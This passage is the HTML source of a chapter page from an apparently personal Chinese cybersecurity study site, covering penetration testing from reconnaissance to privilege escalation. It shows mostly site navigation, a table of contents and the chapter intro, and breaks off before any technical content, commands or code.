@@ -1,0 +1,2012 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="从零开始的网络空间安全学习笔记">
+      
+      
+        <meta name="author" content="我自己">
+      
+      
+        <link rel="canonical" href="https://king-sw-0106.github.io/security-kb/08-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98-%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%88%B0%E6%8F%90%E6%9D%83/">
+      
+      
+        <link rel="prev" href="../07-%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB/">
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>🟢 层4 渗透实战 - 网安知识库</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#08" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href=".." title="网安知识库" class="md-header__button md-logo" aria-label="网安知识库" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            网安知识库
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              🟢 层4 渗透实战
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="切换暗色模式"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="切换暗色模式" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="切换亮色模式"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="切换亮色模式" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="分享" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="网安知识库" class="md-nav__button md-logo" aria-label="网安知识库" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    网安知识库
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🏠 起点
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../00-%E7%9B%AE%E5%BD%95%E4%B8%8E%E8%BF%9B%E5%BA%A6/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    📊 目录与进度
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../01-C%E8%AF%AD%E8%A8%80-%E6%8C%87%E9%92%88%E4%B8%8E%E5%86%85%E5%AD%98/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🔴 层0-A C语言指针与内存
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../02-Python-%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E9%80%9F%E9%80%9A/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🔴 层0-B Python安全工具
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../03-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB-%E7%A8%8B%E5%BA%8F%E5%A6%82%E4%BD%95%E8%BF%90%E8%A1%8C/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🔴 层1 计算机体系
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../04-%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE-%E6%95%B0%E6%8D%AE%E5%A6%82%E4%BD%95%E4%BC%A0%E8%BE%93/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🔴 层2 网络协议
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../05-%E5%AF%86%E7%A0%81%E5%AD%A6-%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🟡 层3-A 密码学
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../06-Web%E5%AE%89%E5%85%A8-%E6%BC%8F%E6%B4%9E%E4%B8%8E%E9%98%B2%E5%BE%A1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🟡 层3-B Web安全
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../07-%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🟡 层3-C 二进制安全
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🟢 层4 渗透实战
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🟢 层4 渗透实战
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🚪 门前检查
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📊 本章进度
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. 渗透测试标准流程
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="1. 渗透测试标准流程">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🏪 生活场景：安保公司做银行安全检查
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔍 现实中的渗透测试标准
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. 📌 信息收集——踩点与侦察
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2. 📌 信息收集——踩点与侦察">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#21" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.1 被动信息收集（不直接接触目标）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#22" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.2 主动信息收集（接触目标）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📋 信息收集清单
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. 漏洞扫描——自动化发现弱点
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. 漏洞利用——拿下初始访问
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4. 漏洞利用——拿下初始访问">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#41" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.1 最常见的初始突破方式
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#42-shell-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.2 拿到初始 shell 后——升级为完整交互式 shell
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-root" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. 📌 提权技术——从普通用户到 root
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5. 📌 提权技术——从普通用户到 root">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ceo" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🏪 生活场景：从大厅闯入 CEO 办公室
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#51" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.1 上线后第一件事：信息收集
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#52" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.2 常见提权路径速查
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔍 提权速查资源
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. 后渗透与横向移动
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-dc-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7. 🧪 全程跟做：DC-1 靶机完整渗透
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="7. 🧪 全程跟做：DC-1 靶机完整渗透">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        环境搭建
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#12" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        完整 12 步
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8. 写好渗透报告
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🛠️ 工具清单速查
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📝 复习自检
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🎬 推荐靶场与平台
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔗 知识串联（全部！）
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🔗 知识串联（全部！）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🏁 全知识库学完！恭喜！
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🚪 门前检查
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📊 本章进度
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. 渗透测试标准流程
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="1. 渗透测试标准流程">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🏪 生活场景：安保公司做银行安全检查
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔍 现实中的渗透测试标准
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. 📌 信息收集——踩点与侦察
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2. 📌 信息收集——踩点与侦察">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#21" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.1 被动信息收集（不直接接触目标）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#22" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2.2 主动信息收集（接触目标）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📋 信息收集清单
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. 漏洞扫描——自动化发现弱点
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. 漏洞利用——拿下初始访问
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4. 漏洞利用——拿下初始访问">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#41" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.1 最常见的初始突破方式
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#42-shell-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4.2 拿到初始 shell 后——升级为完整交互式 shell
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-root" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. 📌 提权技术——从普通用户到 root
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5. 📌 提权技术——从普通用户到 root">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ceo" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🏪 生活场景：从大厅闯入 CEO 办公室
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#51" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.1 上线后第一件事：信息收集
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#52" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.2 常见提权路径速查
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔍 提权速查资源
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. 后渗透与横向移动
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-dc-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7. 🧪 全程跟做：DC-1 靶机完整渗透
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="7. 🧪 全程跟做：DC-1 靶机完整渗透">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        环境搭建
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#12" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        完整 12 步
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8. 写好渗透报告
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🛠️ 工具清单速查
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📝 复习自检
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🎬 推荐靶场与平台
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔗 知识串联（全部！）
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🔗 知识串联（全部！）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🏁 全知识库学完！恭喜！
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="08">08 · 渗透实战——从信息收集到提权<a class="headerlink" href="#08" title="Permanent link">&para;</a></h1>
+<blockquote>
+<p><strong>⏪ 前置知识：</strong> 01 到 07 全部——这是全书的总汇
+<strong>⏩ 学完后解锁：</strong> 真实渗透测试、漏洞赏金猎人、CTF 综合赛
+<strong>⏱ 预计用时：</strong> 5-6 小时（多动手少读，80% 时间在打靶场）
+<strong>🎯 核心目标：</strong> 独立完成一个靶机的完整渗透——从发现 IP 到拿到 root flag</p>
+</blockquote>
+<hr />
+<h2 id="_1">🚪 门前检查<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p><strong>在开始本章之前，你必须能回答：</strong></p>
+<ul class="task-list">
